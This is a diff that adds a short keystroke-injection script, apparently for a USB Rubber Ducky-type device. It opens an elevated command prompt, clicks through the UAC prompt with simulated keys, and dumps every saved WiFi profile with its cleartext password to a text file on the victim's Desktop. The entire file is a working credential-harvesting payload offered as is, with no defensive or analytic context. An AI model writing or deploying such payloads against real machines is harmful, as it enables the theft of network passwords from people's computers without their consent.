@@ -1,0 +1,17 @@
+REM Windows WiFi profile dump to Desktop
+REM Author: Ansfidine Youssouf
+REM Dumps all saved WiFi profiles + passwords to DESKTOP\wifi_dump.txt
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 1500
+LEFT
+ENTER
+DELAY 1500
+STRING netsh wlan show profiles > %USERPROFILE%\Desktop\wifi_dump.txt && netsh wlan show profiles * key=clear >> %USERPROFILE%\Desktop\wifi_dump.txt
+ENTER
+DELAY 2000
+STRING exit
+ENTER
